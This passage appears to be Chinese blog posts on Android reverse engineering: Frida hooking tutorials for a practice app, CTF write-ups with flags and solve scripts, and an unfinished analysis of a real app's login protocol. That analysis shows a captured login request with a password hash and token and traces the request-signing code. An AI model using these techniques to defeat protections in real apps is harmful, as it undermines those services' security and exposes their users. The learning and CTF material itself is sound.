Java层通杀","url":"/2020/06/11/逆向/XposedFridaHook系列/Hook开始/","content":"\n\n\n# Hook 通杀\n\n## Hook 普通方法和修改函数参数返回值\n\nfradaserver 是手机端的，\n\n1. android低版本 frida 尽量低版本\n2. fridaserver版本要与frida库版本一致\n3. 不同平台用不同fridaserver\n4. 不要和xposed装一起，新疆模拟器，刷机\n\n设备要求:\n\n​\troot\n\n \t调试\n\n下载frida-server push到手机中 (注意查看手机是86的还是64的)\n\n` adb push .\\frida-server-12.8.14-android-x86 /data/local/tmp/fsx86`\n\n![image-20200319214805400](E:\\博客\\andorid逆向\\Frida学习\\Hook开始.assets\\image-20200319214805400.png)\n\n之后cd到tmp目录下\n\n先给fsx86 赋权  `chmod 777 fsx86`\n\n之后执行即可。 `./fsx86`\n\n执行后有一个报错，这里是版本出现的问题，会有一些小bug ，不影响使用，最好还是在真机中调试\n\n`WARNING: linker: ./fsx86: unused DT entry: type 0x6ffffef5 arg 0x1c24`\n\n## 插入一个学习\n\n![image-20200320103048870](E:\\博客\\andorid逆向\\Frida学习\\Hook开始.assets\\image-20200320103048870.png)\n\nHook 构造方法\n\n​\t绕过一些验证\n\n​\t构造方法\n\n​\t`money.$init.implementation = function(){}`\n\nHook 重载方法\n\n![image-20200320105658343](E:\\博客\\andorid逆向\\Frida学习\\Hook开始.assets\\image-20200320105658343.png)\n\nHook 重载方法\n\n```\nfunction hooktest2() {\n    //Error: test(): has more than one overload, use .overload(<signature>)\n    var utils = Java.use(\"com.xiaojianbang.app.Utils\");\n    utils.test.overload('int').implementation = function (a) {\n        a = 888;\n        var retval = this.test();\n        console.log(a, retval);\n        return retval;\n    };\n    utils.test.overload().implementation = function () {\n        var retval = this.test();\n        console.log(retval);\n        return retval;\n    };\n    utils.test.overload('com.xiaojianbang.app.Money').implementation = function (a) {\n        var retval = this.test(a);\n        console.log(retval);\n        return retval;\n    }\n}\n\n```\n\nHook 所有重载方法\n\n```\nfunction hookTest3() {\n    // hook 方法的所有重载\n    var utils = Java.use(\"com.xiaojianbang.app.Utils\");\n    console.log(utils.test.overloads.length);\n    for (var i = 0; i < utils.test.overloads.length; i++) {\n        utils.test.overloads[i].implementation = function () {\n            // console.log(JSON.stringify(arguments));\n\n            if (arguments.length == 0) {\n                return \"调用没有参数的\";\n            } else if (arguments.length == 1){\n                if (JSON.stringify(arguments).indexOf(\"Money\") != -1){\n                    return \"调用了Money参数的\";\n                }else{\n                    return \"调用了Int 类型的\";\n                }\n            }\n\n                arguments[0] = 1000;\n            // console.log(arguments.length);\n            // apply 改变所属\n            return this.test.apply(this, arguments);\n        }\n    }\n}\n```\n\nHook 构造参数与对象实例化\n\n![image-20200321172539738](E:\\博客\\andorid逆向\\Frida学习\\Hook开始.assets\\image-20200321172539738.png)\n\n![image-20200321173626852](E:\\博客\\andorid逆向\\Frida学习\\Hook开始.assets\\image-20200321173626852.png)\n\n```\nfunction hooktest2() {\n    //Error: test(): has more than one overload, use .overload(<signature>)\n    var utils = Java.use(\"com.xiaojianbang.app.Utils\");\n    var money = Java.use(\"com.xiaojianbang.app.Money\");\n\n    utils.test.overload('int').implementation = function (a) {\n        a = 888;\n        var retval = this.test(money.$new(\"日元\", 1000000)); // 对象实例化\n        console.log(a, retval);\n        return retval;\n    };\n```\n\n\n\n\n\nhook 实例化\n\n\n\n![image-20200321174929718](E:\\博客\\andorid逆向\\Frida学习\\Hook开始.assets\\image-20200321174929718.png)\n\n```\nfunction hookTest5() {\n    Java.perform(function () {\n        //静态字段的修改\n        var money = Java.use(\"com.xiaojianbang.app.Money\");\n        //send(JSON.stringify(money.flag));\n        money.flag.value = \"ceshi\";\n        console.log('log', money.flag.value);\n        // 非静态字段的修改\n        Java.choose(\"com.xiaojianbang.app.Money\", {\n            onMatch: function (obj) {\n                obj._name.value = \"ouyuan\"; // 字段与函数名相同， 前面加下划线\n                obj.num.value = 15254131;\n            },\n            onComplete: function () {\n\n            },\n        });\n    });\n}\n```\n\n\n\n 获取所有的类\n\n```\nfunction hookTest7() {\n    Java.perform(function () {\n        Java.enumerateLoadedClasses({\n            onMatch:function (name,handle) {\n                if (name.indexOf(\"com.xiaojianbang.app\") != -1){\n                    console.log(name);\n                    var clazz = Java.use(name);\n                    var methods = clazz.class.getDeclaredMethods();\n                    console.log(methods)\n                    for (var i = 0 ; i< methods.length;i++){\n                        console.log(methods[i]);\n                    }\n                }\n            },\n            onComplete:function () {\n\n            },\n        });\n\n```\n\n```\nvar classes = Java.enumerateLoadedClassesSync();\nfor (var i = 0 ; i < classes.length ; i++){\n    if (classes[i].indexOf(\"com.xiaojianbang.app\") != -1){\n        console.log(classes[i]);\n        var clazz = Java.use(classes[i]);\n        var methods = clazz.class.getDeclaredMethods();\n        for (var j = 0 ;j < methods.length ;j++){\n            console.log(methods[j]);\n        }\n    }\n\n\n}\n```\n\n# Hook 回笼重造\n\n<img src=\"E:\\博客\\andorid逆向\\Frida学习\\Hook开始.assets\\image-20200324171350015.png\" alt=\"image-20200324171350015\" style=\"zoom:50%;\" />\n\n> xposed 框架替换了很多文件，如果要从xposed转frida 需要刷机\n\n修改debuggable 参考：https://www.bodkin.ren/index.php/archives/533/\n\n```\n[Go0s]: ~/Security/_Tools/Android/mprop/armeabi-v7a ✗ master*\n➜  adb push mprop /data/local/tmp              \nmprop: 1 file pushed. 1.6 MB/s (17712 bytes in 0.011s)\n[Go0s]: ~ \n➜  adb shell\nshell@hammerhead:/ $ cat default.prop | grep debug                             \nro.debuggable=0\nshell@hammerhead:/ $ getprop ro.debuggable\n0\nshell@hammerhead:/ $ cd /data/local/tmp\nshell@hammerhead:/data/local/tmp $ su\nroot@hammerhead:/data/local/tmp # ./mprop ro.debuggable 1   \nproperties map area: b6f7a000-b6f9a000\n00000000  08 8d 00 00 19 01 00 00 50 52 4f 50 ab d0 6e fc  ........PROP??n?\n00000010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n……\nroot@hammerhead:/ # cat default.prop | grep debug                              \nro.debuggable=0\nroot@hammerhead:/ # getprop ro.debuggable                                      \n1\n```\n\n版本太高导致的问题，问题不会大\n\n![image-20200324192712444](E:\\博客\\andorid逆向\\Frida学习\\Hook开始.assets\\image-20200324192712444.png)\n\n配置代码提示\n\n```npm i @types/frida-gum```\n\n\n\nhook步骤\n\n1. 进入手机终端 启动 fsx86\n2. 端口转发\n3. 使用命令开始hook吧 `frida -U 包名 -l hook代码`\n\n### 逻辑分析\n\n要hook getCalc 方法，定位到函数声明\n\n![image-20200324201846328](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200324201846328.png)\n\n定位到getCalc  方法有两个参数 a,b \n\n![image-20200324201919870](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200324201919870.png)\n\n### Hook普通方法\n\n接下来根据这个函数开始hook\n\n​\t`var utils = Java.use(\"com.xiaojianbang.app.Utils\");` 定位函数\n\n​\t重写方法 implementation \n\n```\nvar utils = Java.use(\"com.xiaojianbang.app.Utils\");\nutils.getCalc.implementation = function (a,b) { // implementation 是重写方法， js中不需要函数类型\n\t// 先打印一下a,b 参数和返回的参数\n    var retval = this.getCalc(a,b); \n\n    console.log(a,b,retval);\n    return retval;\n}\n```\n\n​\t点击普通方法，即可在frida中看到获取的参数\n\n![image-20200324202244461](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200324202244461.png)\n\n之后修改a ，b 参数\n\n```\nvar utils = Java.use(\"com.xiaojianbang.app.Utils\");\nutils.getCalc.implementation = function (a,b) { // implementation 是重写方法， js中不需要函数类型\n    a = 123;\n    b = 345;\n\n    var retval = this.getCalc(a,b);\n\n    console.log(a,b,retval);\n    return retval;\n}\n```\n\n![image-20200324203353529](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200324203353529.png)\n\n\n\n### Hook 重载方法和重载方法的Hook\n\n重载方法和一般普通方法区别不大\n\n![image-20200324205305292](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200324205305292.png)\n\n当使用之前的方法 去hook重载方法\n\n![image-20200324205229878](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200324205229878.png)\n\n需要使用overload 去指定参数\n\n```\n    utils.test.overload('int').implementation = function (a, b) { // implementation 是重写方法， js中不需要函数类型\n\n```\n\n最后hook所有的重载方法\n\n只要符合返回值，可以随意改的，即使调用其他的重载函数也是可以执行\n\n```\nutils.test.overload('int').implementation = function (a) { // implementation 是重写方法， js中不需要函数类型\n    a = 888888888;\n    var retval = this.test(a);\n    console.log(a, retval);\n    return retval;\n};\nutils.test.overload().implementation = function () {\n    var retval = this.test();\n    console.log(\"无参：\",retval);\n    return retval;\n};\nutils.test.overload(\"com.xiaojianbang.app.Money\").implementation = function (a) {\n    var retval = this.test(a);\n    console.log(a,retval);\n    return retval;\n};\n```\n\nHook所有重载函数\n\n```\nfor (var i = 0 ;i < utils.test.overloads.length;i++){ // 通过for 循环去获取每一个\n    utils.test.overloads[i].implementation = function () {\n        console.log(arguments); // arguments 是一个数组\n    }\n}\n```\n\n通过apply 可以避免每次返回需要改变返回参数的问题\n\n```\nthis.test.apply(this,arguments) // apply 是改变函数所属\n```\n\n>  在frida 中，在同位置下多个钩子 最后一个会生效，因为他的代码会覆盖之前的代码。\n\n返回hook每个重载函数 参数长度\n\n```\nfunction hookTest3() {\n    // hook方法的所有重载\n    var utils = Java.use(\"com.xiaojianbang.app.Utils\");\n    console.log(utils.test.overloads.length)\n    // 之后遍历参数\n    for (var i = 0 ;i < utils.test.overloads.length;i++){\n        utils.test.overloads[i].implementation = function () {\n            //console.log(arguments);\n\n            return this.test.apply(this,arguments) // apply 是改变函数所属\n        }\n    }\n}\n```\n\n返回结果\n\n![](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200324213234513.png)\n\n如果需要修改其中的某个重载函数 则需要在这里做一个判断\n\n```\nif (arguments.length == 0){\n    return \"xiaojianbang\";\n}\n```\n\n\n\nhook 完整代码\n\n```\nfunction hookTest3() {\n    // hook方法的所有重载\n    var utils = Java.use(\"com.xiaojianbang.app.Utils\");\n    console.log(utils.test.overloads.length)\n    // 之后遍历参数\n    for (var i = 0 ;i < utils.test.overloads.length;i++){\n        utils.test.overloads[i].implementation = function () {\n            //console.log(arguments);\n            if (arguments.length == 0){\n                return \"xiaojianbang\";\n            }else if (arguments.length ==  1){\n                if (JSON.stringify(arguments).indexOf(\"Money\") != -1 ){\n                    return \"调用了Money参数\";\n                } else{\n                    return \" 调用了int参数的\";\n                }\n            }\n            return this.test.apply(this,arguments) // apply 是改变函数所属\n        }\n    }\n}\n```\n\n## Hook 构造函数与对象实例化\n\n这里的`Money` 是我们的构造函数 函数与类型一致 \n\n![image-20200324215249350](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200324215249350.png)\n\n也需要指明\n\n![image-20200324215639928](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200324215639928.png)\n\n构造函数和重载只是多了个 $init\n\n```\nfunction hookTest4() {\n    var money = Java.use(\"com.xiaojianbang.app.Money\");\n    // 函数名与方法名一致\n    money.$init.overload('java.lang.String','int').implementation = function (str,num) {\n        console.log(str,num);\n        this.$init(str,num);\n    }\n}\n```\n\n在上一节重载函数，我们调用了money ，但是当我们要修改其中的值时 需要调用money的包\n\n![image-20200324220110549](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200324220110549.png)\n\n在函数开始位置添加\n\n![image-20200324220151168](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200324220151168.png)\n\n这就完成了一个实例化\n\n![image-20200324220241983](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200324220241983.png)\n\n## 修改类的字段\n\n先尝试hook一下静态资源\n\n```\nvar money = Java.use(\"com.xiaojianbang.app.Money\");\n//send(money.flag)\nconsole.log(JSON.stringify(money.flag.value));\n```\n\n> 多个对象就会有多个字段，所以要修改 必须找到对应的字段\n\n修改字段\n\n```\n// 静态字段\nvar money = Java.use(\"com.xiaojianbang.app.Money\");\n//send(money.flag)\nmoney.flag.value = \"xiaojianbang\";\n\nconsole.log(JSON.stringify(money.flag.value));\n```\n\nhook 修改非静态字段\n\n> 正常的每次修改都会new一个对象，所以看不到返回的值\n\n![image-20200324222948009](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200324222948009.png)\n\n```\nJava.choose(\"com.xiaojianbang.app.Money\", {\n    onMatch: function (obj) { // 每次遍历对象都会调用一次onMatch\n        // 修改对象参数，如果修改单个 价格判断即可\n        obj._name.value = \"ouyuan\"; // 这块注意字段名与函数名是否相同\n        obj.num.value = 15000000;\n    },\n    onComplete: function () {\n\n    }\n});  // cakkbacks指的是对象\n```\n\n> 这块注意 当字段名与函数名相同 要加`_`来区分\n\n## hook 内部类和匿名类\n\n当hook 类下的类 hook方法\n\n可以通过jeb smail 去看 \n\n![image-20200324230631123](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200324230631123.png)\n\nmoney 只是一个父类，匿名类是getInfo 这里实现了一次， 匿名类一般都是$1 这种形式\n\n![image-20200324231541211](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200324231541211.png)\n\n## 枚举所有的类和所有的方法\n\n```\nJava.enumerateLoadedClasses() //枚举类 只能加载 已经被加载的类\n```\n\njava反射获取方法\n\n```\nvar methods = clazz.class.getDeclaredMethods();\n```\n\n获取所有的类\n\n```\nJava.enumerateLoadedClasses({\n    onMatch:function (name,handle) { // 代码都是写在这里的\n        if (name.indexOf(\"com.xiaojianbang.app\") != -1){\n            console.log(name) \n        }\n    },\n    onComplete:function () { // 这里只会使用一次\n\n    }\n})\n```\n\n获取类下的方法\n\n```\n Java.enumerateLoadedClasses({\n            onMatch:function (name,handle) { // 代码都是写在这里的\n                if (name.indexOf(\"com.xiaojianbang.app\") != -1){\n                    console.log(name) // 类和地址  打印好多系统类，这里就要做个过滤\n                    // 遍历类下的所有的方法 java 反射 有个getDeclaredMethods\n                    var clazz = Java.use(name);\n                    console.log(clazz);\n                    var methods = clazz.class.getDeclaredMethods(); // 得到的是一个对象，这里要通过class转\n                    //console.log(methods);  // 直接打印输出较乱 做一个整理\n\n                    if (var i = 0; i < methods[i].length;i++){\n                        console.log(methods[i]);\n                    }\n                    console.log()\n\n\n\n                }\n            },\n            onComplete:function () { // 这里只会使用一次\n\n            }\n        })\n```\n\n异步方式获取类和类的方法\n\n```\nvar classes = Java.enumerateLoadedClassesSync();\nfor (var i = 0; i < classes.length; i++) {\n    if (classes[i].indexOf(\"com.xiaojianbang.app\") != -1) {\n        console.log(classes[i]);\n        var clazz = Java.use(classes[i]);\n        var methods = clazz.class.getDeclaredMethods();\n        for (var j = 0; j < methods.length; j++) {\n            console.log(methods[j]);\n        }\n    }\n}\n```\n\n## hook类的所有方法\n\n首先确定hook那个类， 比如md5，之后通过java反射 获取类下的方法\n\n```\nvar md5 = Java.use(\"com.xiaojianbang.app.MD5\");\nvar methods= md5.class.getDeclaredMethods();\n```\n\n之后通过循环返回打印\n\n```\nfunction hookTest8() {\n    Java.perform(function () {\n        var md5 = Java.use(\"com.xiaojianbang.app.MD5\");\n        var methods = md5.class.getDeclaredMethods();\n        for (var i = 0; i < methods.length; i++) {\n            var methodName = methods[i].getName();\n            console.log(methodName);\n            for (var k = 0; k < md5[methodName].overloads.length; k++) {\n                md5[methodName].overloads[k].implementation = function () {\n                    for (var j = 0; j < arguments.length; j++) {\n                        console.log(arguments[j]);\n                    }\n                    return this[methodName].apply(this, arguments) // 不知道返回的对象\n                }\n            }\n\n        }\n    })\n}\n```\n\n## 动态加载dex\n\n遇到问题： 在调用函数后，有些dex 是通过动态加载调用的，反编译并不会反编译到所有的dex\n\n一般可以通过DexClassLoader动态加载，或者通过so层 或者内存中去加载\n\n这里通过DexClassLoader去加载，文件放在apk的目录中\n\n![image-20200325214341078](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200325214341078.png)\n\n当直接调用就会报错\n\n```\nfunction hookTest9() {\n    Java.perform(function () {\n        var dynamic = Java.use(\"com.xiaojianbang.app.Dynamic\");\n        console.log(dynamic);\n    })\n}\n```\n\n![image-20200325214906826](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200325214906826.png)\n\n这里就要找到对应的classloader  \n\n> 注意：这个api是要在7版本以上使用，用android5 可能会报错\n\n```\nfunction hookTest9(){\n    Java.perform(function(){\n\n        Java.enumerateClassLoaders({\n            onMatch: function(loader){\n                try {\n                    if(loader.loadClass(\"com.xiaojianbang.app.Dynamic\")){\n                        Java.classFactory.loader = loader;\n                        var Dynamic = Java.use(\"com.xiaojianbang.app.Dynamic\");\n                        console.log(Dynamic);\n                        Dynamic.sayHello.implementation = function(){\n                            return \"xiaojianbang\";\n                        }\n                    }\n                } catch (error) {\n\n                }\n            }\n            ,\n            onComplete: function(){\n\n            }\n        });\n    });\n}\n```\n\n![image-20200326091943750](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200326091943750.png)\n\n\n\n> Java.classFactory.loader = loader; 这里的loader 可能会报错 不影响正确性\n\n\n\n## Java 里特殊类型的遍历与修改\n\nHook map 或者修改其中的某些值\n\n\n\n![image-20200329001310423](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200329001310423.png)\n\n![image-20200329001325832](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200329001325832.png)\n\n这块可以使用show（java的代码） 去hook\n\n可以将show方法 直接copy过去，但是要注意里面的函数要遵守js的语法\n\n这块要使用迭代器去获取map\n\n```\n不要调用伪代码的方法，而是去自写\nfunction hookTest10(){\n    Java.perform(function () {\n        var ShufferMap = Java.use(\"com.xiaojianbang.app.ShufferMap\")\n        console.log(ShufferMap);\n        ShufferMap.show.implementation = function (map) {\n            console.log(JSON.stringify(map));\n\n            var key = map.keySet();\n            var it = key.iterator();\n            var result = \"\";\n            while (it.hasNext()) {\n                var keystr = it.next();\n                var valuestr = map.get(keystr);\n                result += valuestr;\n            }\n        console.log(result);\n        return result;\n\n        }\n    })\n}\n```\n\n之后是java 特殊类型的修改\n\n```\nfunction hookTest10(){\n    Java.perform(function () {\n        var ShufferMap = Java.use(\"com.xiaojianbang.app.ShufferMap\")\n        console.log(ShufferMap);\n        ShufferMap.show.implementation = function (map) {\n            console.log(JSON.stringify(map));\n        // 2 修改特殊方法\n            map.put(\"pass\",\"zygx8\");\n            map.put(\"xxxx\",\"www.zygx8.com\");\n            var retval = this.show(map);\n            console.log(retval);\n            return retval;\n\n        }\n    })\n}\n```\n\n## Java 层主动调用函数\n\n只有当函数被触发才会被执行，那么当我们需要解密一个比较复杂的算法，是可以通过主动调用函数去获取的\n\n静态主动调用\n\n```\n调用rsa方法\nfunction hookTest11() {\n    Java.perform(function () {\n        var rsa = Java.use(\"com.xiaojianbang.app.RSA\");\n        var str = Java.use(\"java.lang.String\");\n        var base64 = Java.use(\"android.util.Base64\");\n        var bytes = str.$new(\"xioajianbang\").getBytes();\n        console.log(bytes);\n        var retval = rsa.encrypt(bytes);\n        console.log(retval);\n        var result = base64.encodeToString(retval,0);\n        console.log(result);\n    })\n}\n```\n\n非静态方法的主动调用 调用getinfo\n\n```\n Java.use(\"com.xiaojianbang.Money\").$new(\"欧元\",3000000).getInfo();\n```\n\n\n\n## Java 打印函数堆栈\n\n之前使用Log.d 来打印信息\n\n![image-20200330115446399](D:\\Blog\\ST0new.github.io\\source\\_posts\\逆向\\XposedFridaHook系列\\Hook开始.assets\\image-20200330115446399.png)\n\n推荐： 使用`Log.getStack.TrachString(new Throwable())` 或``Log.getStack.TrachString(new exception())``\n\n```\nfunction hookTest12() {\n    // 写一个函数堆栈\n    function showStacks(){\n        console.log(Java.use(\"android.util.Log\").getStackTraceString(Java.use(\"java.lang.Exception\").$new()));\n        //console.log(Java.use(\"android.util.Log\").getStackTraceString(Java.use(\"java.lang.Exception\").$new()));\n    }\n    Java.perform(function () {\n        //Java.cast();\n        //Java.openClassFile();\n        var MessageDigest =  Java.use(\"java.security.MessageDigest\");\n        MessageDigest.digest.overload().implementation = function () {\n            showStacks();\n            return this.digest();\n\n        }\n    })\n}\n```","tags":["hook"],"categories":["Reverse"]},{"title":"最右登录协议分析","url":"/2020/06/08/逆向/破解/某右登录协议分析/","content":"\n# 某右\n\n ## 版本\n\n版本号：4.8.1\n\n## 抓包\n\n一般抓包建议对同一请求抓两次，分析其中会变化的字段\n\n```\nPOST http://api.izuiyou.com/account/login?sign=deedf5a731f7a8ed40f742cf29c5a64e HTTP/1.1\nRequest-Type: text/json\nZYP: mid=231563243\nUser-Agent: okhttp/3.11.0 Zuiyou/4.8.1\nContent-Type: application/json; charset=utf-8\nContent-Length: 340\nHost: api.izuiyou.com\nConnection: Keep-Alive\nAccept-Encoding: gzip\n\n{\"phone\":\"16530987112\",\"pw\":\"e10adc3949ba59ab\",\"region_code\":86,\"h_av\":\"4.8.1\",\"h_dt\":0,\"h_os\":23,\"h_app\":\"zuiyou\",\"h_model\":\"BLA-AL00\",\"h_did\":\"8f0e7d9ecfa1c535\",\"h_nt\":1,\"h_m\":231563243,\"h_ch\":\"GDT-jx-20\",\"h_ts\":1591758523490,\"token\":\"T5K2N3DX2cgc8bJipLVdmXrQ13XPGNBQMxs3mXkH151w76G8W9Pu83607HslY3KJVJBba\",\"android_id\":\"8f0e7d9ecfa1c535\"}\nHTTP/1.1 200 OK\nDate: Wed, 10 Jun 2020 03:08:45 GMT\nContent-Type: text/plain; charset=utf-8\nContent-Length: 43\nConnection: keep-alive\nSet-Cookie: aliyungf_tc=AQAAAEpiYWhdAAoArBSR26gs4jI7ssiw; Path=/; HttpOnly\nxcserververify: 1\nAccess-Control-Allow-Origin: *\n\n{\"ret\":-3,\"msg\":\"手机号还没有注册\"}\n```\n\n对比分析后，主要对 `sign`、`token`等加密字段做分析\n\n## 参数分析\n\n搜索一波  找到url请求位置\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200610162324.png)\n\n\n\n查看用例 找到P 方法，P有两个参数 调试后 分别对应手机号、密码\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200610164039.png)\n\n 看看第一句 zk 跟进\n\n```\npublic void zK() {\n        int i = 1;\n        if (this.bam.containsKey(\"pwd_login_bc\")) {//Map 集合 containsKey方法——判断是否包含指定的键名 \n            i = 1 + ((Integer) this.bam.get(\"pwd_login_bc\")).intValue();\n        }\n        this.bam.put(\"pwd_login_bc\", Integer.valueOf(i));\n    }\n\n```\n\n```\nonStart \npublic void onStart(String str) {\n        runOnUiThread(new Runnable() {\n            public void run() {\n                if (!LoginActivity.this.isFinishing()) {\n                    LoginActivity.this.login.setEnabled(false);\n                    gf.l(LoginActivity.this); // 类型 初始化\n                    ahn.d(LoginActivity.this, \"登录中...\");\n                }\n            }\n        });\n    }\n\n```\n\n在分析完 P 方法后 没有找到请求的完整参数，也没有看到返回的`手机号还未注册`看来这里突破不容易， 重新搜索其他参数 寻找关键参数。 最后搜素 `u_did` 找到拼接参数，比较一下参数 应该就在这里了。\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200610180432.png)\n\n其中的参数都是不变的，那这里就可以结束了。\n\n分析在请求中 url带的sign\n\n搜索技巧 `sign=` 找到三处，在这个方法比较相似，于是hook了一下，确定sign的生成就在这里。\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200611112037.png)\n\n可以看到 url对应，参数对应，结果也一致。\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200611112300.png)\n\n使用ida 打开 net_crypto.so 分析sign是怎么生成的。\n\n搜索一下 `Java_` 和`JNI_onload` 看看是否动态注册和存在generateSign方法\n\n存在`JNI_onload`，查看他的伪代码 `F5`，修改一下参数类型，不然识别不出来`RegisterNatives`\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200611143926.png)\n\n跟到注册函数的第三个参数\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/6/20200611144051.png)\n\n\n\n未完待续 。。。。","tags":["破解"],"categories":["Reverse"]},{"title":"攻防世界-RememberOther","url":"/2020/05/30/CTF/攻防世界/RememberOther/","content":"\n# RememberOther\n\n## 附件下载\n\nhttps://adworld.xctf.org.cn/media/task/attachments/476d9022bb0449c09c0b1e24f0686b66.zip\n\n## 分析\n\n先安装 然后看看逻辑\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200530112854.png)\n\n额 这个不就是注册机吗，这个做过，方法比较多， 直接看jadx 反编译出的代码，看看flag在哪\n\n看到有个判断，应该是需要注册成功后返回\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200530114236.png)\n\n那么打开Androidkiller 修改if 判断处的逻辑，然而 我没找到if 判断，那就只能改checkSN方法了\n\n![](D:\\Blog\\ST0new.github.io\\source\\_posts\\CTF\\攻防世界\\photo\\20200530115843.png)\n\n然后安装 点击注册\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200530115913.png)\n\n直接输出flag\n\n同样 ，在返回值中，返回的是R.string.unsuccessed ，这是一个静态的字符串，strings.xml 中可以找到具体的值\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200530120407.png)\n\nmd5:b3241668ecbeb19921fdac5ac1aafa69\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200530120448.png)\n\n解出 md5 值\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200530120600.png)\n\n然后 这个是个半段，还有半段在word文档中，这是个坑，看了wp后才知道\n\n所以最后的flag ： YOU_KNOW_ANDROID","tags":["CTF"],"categories":["Reverse"]},{"title":"攻防世界-Ph0en1x-100","url":"/2020/05/29/CTF/攻防世界/Ph0nen1x-100/","content":"\n# Ph0en1x-100\n\n## 附件下载\n\nhttps://adworld.xctf.org.cn/media/task/attachments/f6adc401d0eb472892a4ac4481f76a85.apk\n\n## 分析\n\n上手第一步还是看app逻辑， 可以看的出来 输入flag 判断正确与否，又是一个算法题。\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529162137.png)\n\n打开`jadx` 找到`MainActivity`,很明显就可以看到`Success`，\n\n目标：输入正确的flag 让if 判断成立 \n\n```\n先对输入的字符串进行了一次encrypt， 之后在进行一次getSecret ，然后和getFlag() 做了一次判断是否相等\ngetSecret(getFlag()).equals(getSecret(encrypt(this.etFlag.getText().toString())))\n```\n\n### 分析encrypt 函数\n\n在jadx中查看函数声明，居然是so里面的，分析吧 \n\n搜索字符串 关键字`Java_` 直接找到加密方法，进去看看调用逻辑，并不是很难。\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529163739.png)\n\n然后看看伪代码\n\na1 是传入进去的字符串，然后 i 是v2的第一个字符，对i的值进行减一   那他这里就是一个位移加密了。\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529164307.png)\n\n### 分析getFlag()\n\n分析了半天，感觉静态分析很难，然后看了下别人的思路，我是着实没想到，把这个方法运行一下就得到了flag\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529171947.png)\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529172050.png)\n\n得到字符串后编写脚本拿到flag\n\n## 脚本\n\n```\nflag = \"ek`fz@q2^x/t^fn0mF^6/^rb`qanqntfg^E`hq|\"\nresult = \"\"\n\nfor i in flag:\n    result += chr((ord(i)+1))\n\nprint(result)\n```\n\nresult:flag{Ar3_y0u_go1nG_70_scarborough_Fair}\n\n\n\n## 其他解\n\n之后我看了下网上的解法，很多，这里用一个frida hook 拿到getflag 和动态调试拿到flag来演示\n\n### frida hook getFlag\n\n编写脚本 hook代码\n\n命令： `frida -U com.ph0en1x.android_crackme -l Hook.js`\n\n```\nfunction hookphone100() {\n    Java.perform(function () {\n        var getFlag = Module.findExportByName(\"libphcm.so\",\"Java_com_ph0en1x_android_1crackme_MainActivity_getFlag\");\n        console.log(getFlag);\n        if (getFlag != NULL){\n            Interceptor.attach(getFlag,{\n                onEnter:function (args) {\n\n                },\n                onLeave:function (retval) {\n                    var String_java = Java.use('java.lang.String');\n                    var args_4 = Java.cast(retval, String_java)\n                    console.log(retval);\n                    console.log(retval.toInt32());\n                    console.log(\"getFlag()==>\"+args_4)\n                }\n            })\n        }\n    })\n}\nfunction main() {\n    Java.perform(function () {\n        hookphone100();\n    });\n}\n\nsetImmediate(main);\n```\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2020/5/20200529180529.png)\n\n### 动态调试\n\n动态调试 看了西米露表姐的wp ，我也尝试使用jeb 进行动态调试。\n\n先以调试模式启动待调试apk，多下点准没错 然后在如图位置 